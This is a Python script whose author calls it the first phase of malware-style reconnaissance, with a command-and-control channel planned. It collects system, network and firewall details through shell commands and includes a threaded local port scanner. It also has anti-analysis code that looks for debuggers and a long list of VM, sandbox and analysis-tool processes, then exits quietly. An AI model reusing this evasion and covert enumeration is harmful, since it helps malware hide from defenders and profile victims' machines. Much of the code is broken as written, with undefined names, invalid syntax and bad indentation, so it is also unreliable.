#!/usr/bin/env python
#
# Preliminary OS enumeration script, i'm building it like a malware
# so a C2 mechanism will be incoming, either through XMPP for which
# i already have secured infrastructure or something else
# just posting this for now, as a sort of 'phase 1 complete'
# i will be writing a managing module as well so it will be
# Client -> C2 -> Managing module -> ML

import os
import sys
import json
import socket
import random
import ctypes
import subprocess

# import pycurl
# import xmpp
# from Crypto.Cipher import AES

import platform as pf
import getpass as gp

from threading import Thread


# Debugging settings for development
debug = True


# Client ID generator
def gen_client_ID(size=12, chars=string.ascii_uppercase + string.digits):
	return ''.join(random.choice(chars) for _ in range(size))


# Save shell output
def cmdline(command):
    process = subprocess.Popen(
        args=command,
        stdout=subprocess.PIPE,
        shell=True)
    
    return process.communicate()[0]


# Platform independent basic enumeration
def basic_info():
	architecture  = pf.machine()
	version       = pf.platform()
	cpu           = pf.processor()
        sys_name      = pf.node()
	user          = gp.getuser()
    
    if sys.platform == 'win32':
	is_admin = ctypes.windll.shell32.IsUserAnAdmin()
        
        if is_admin == 0:
        	is_admin = 'no'
        else:
		is_admin = 'yes'
			
    else:
	is_admin = 'N/A'
	
	basics = {'Architecture': architecture, 'Version': version, 'CPU': cpu, 
		  'User': user, 'System Name': sys_name, 'Is Admin': is_admin }  
	
	return basics


# Operations for Linux Enum
def handle_linux():
	if debug == True:
		print ("[+]Linux was detected, starting advanced enumeration")
	
	# Assemble Dict
	Data = {}
	Data["IF Config"]     = cmdline('ifconfig -a')
	Data["IP Tables"]     = cmdline('iptables -L')
	Data["ARP Table"]     = cmdline('arp -e')
	Data["Net Listening"] =	cmdline('netstat -ltp')
	Data["Net Connected"] = cmdline('netstat -etp')	
	Data["File System"]   = cmdline('df -h')
	Data["Host File"]     = cmdline('cat /etc/hosts')
	
	return Data

# Operations for Mac Enum
def handle_mac():
	if debug == True:
		print ("[+]Mac was detected, starting advanced enumeration")
		
	# Assemble Dict
	Data = {}
	Data["IP Config"]     = cmdline('ifconfig -a')
	Data["ARP Table"]     = cmdline('arp -e')
	Data["Net Listening"] =	cmdline('netstat -ltp')
	Data["Net Connected"] = cmdline('netstat -etp')	
	Data["File System"]   = cmdline('df -h')
	#Data["Host File"]     = cmdline('cat /etc/hosts')
	
	return Data

# Operations for Windows Enum
def handle_windows():
	if debug == True:
		print ("[+]Windows was detected, starting advanced enumeration")
	
	# Assemble Dict
	Data = {}
	Data["IP Config"]     = cmdline('ipconfig /all')
	Data["ARP Table"]     = cmdline('arp -a')
	Data["Net Connected"] = cmdline('netstat')	
	
	return Data	


# Complimentary feature for Windows operations
def check_win_env():
	# Are we in a VM?
	try:
		import wmi
	except:
		return ("[!]Import issue with WMI")
	
	ProcessList = ["ollydbg.exe","ProcessHacker.exe","vmsrvc.exe",
	"fiddler.exe","tcpview.exe","vmware.exe","vbox.exe","vmvss.exe",
	"vmscsi.exe","vmhgfs.exe","vboxservice.exe","vmxnet.exe","vmx_svga.exe",
	"df5serv.exe","vmmemctl.exe","autoruns.exe","autorunsc.exe","vmusbmouse.exe",
	"filemon.exe","procmon.exe","vmtools.exe","regmon.exe","vboxtray.exe","procexp.exe",
	"vmrawdsk.exe","idaq.exe","idaq64.exe","ImmunityDebugger.exe","Wireshark.exe",
	"dumpcap.exe","HookExplorer.exe","ImportREC.exe","PETools.exe","LordPE.exe",
	"SysInspector.exe","proc_analyzer.exe","sysAnalyzer.exe","sniff_hit.exe","windbg.exe",
	"joeboxcontrol.exe","joeboxserver.exe","vmtoolsd.exe","vmwaretray.exe","vmwareuser.exe",
	"vmusrvc.exe","prl_cc.exe","prl_tools.exe","xenservice.exe"]	

	try:
		for process in wmi.Win32_Process():
			for processName in ProcessList:
				if (process.Name.lower().find(processName) == 0):
					if debug == True:
						return ("[!]It is likely we are in a VM.")
					else:
						# Stop executing
						sys.exit()
				else:
					pass
	except Exception as e:
		if debug == True:
			return e
		else:
			pass
	
	# Is there a debugger present?
	debug_present = ctypes.windll.kernel32.IsDebuggerPresent()

	if debug_present and debug == True:
		return ("[!]A debugger appears to be present")
	elif debug_present:
		# Stop executing
		sys.exit()
	else:
		pass
			

# Port scanner
def port_check():
	host = 127.0.0.1
	
	start_port = 1
	end_port = 25000  
	
	counting_open = []
	counting_close = []
	threads = []

	s = socket.socket()
		
	try:
		result = s.connect_ex((host,port))
	except socket.gaierror as e:
		if debug == True:
			print ("[!]Critical. A GAIerror was raised with the following error message.")
			sys.exit(e)
		else:
			pass      
	
	if result == 0:
		counting_open.append(port)
		s.close()
	else:
		counting_close.append(port)
		s.close()
	
	for items in range(start_port, end_port+1):
		tr = Thread(target=host, args=(items,))
		threads.append(tr)
		tr.start()
	
	[x.join() for x in threads]
	
	if debug == True:
		for ports in counting_open:
			print ("[~]") + str(ports) + (" -> open.")
		
		print ("[+]Scan completed.")
	
	open_ports = { "Open Ports": counting_open }
	
	return open_ports

# Starting function
def surveyor_start():
	Report = {}
	
	if sys.platform == 'linux2':
		
		Report["Base Info"] = basic_info()
		Report["Port Scan"] = port_check()
		Report["Detailed Info"] = handle_linux()
		
		return Report
	
	elif sys.platform == 'win32':
		# Some anti forensics for Windows, just because i can
		try:
			vm_check = check_win_env()
		except:
			print vm_check
		
		Report["Base Info"] = basic_info()
		Report["Detailed Info"] = handle_windows()
		
		return Report
		
	elif sys.platform == 'darwin':
		
		Report["Base Info"] = basic_info()
		Report["Detailed Info"] = handle_mac()
		
		return Report
		
	else:
		Report["WARNING"] = "Uncommon Platform Detected"
		Report["Platform"] = sys.platform()
		Report["Base Info"] = basic_info()
		
		return Report


if __name__ == '__main__':
	JSON_Out = {}
	JSON_Out["Client ID"]   = gen_client_ID()
	JSON_Out["System Info"] = surveyor_start()
	
	with open("out.json", "ab") as outfile:
		json.dump(JSON_Out, outfile)
		outfile.close()
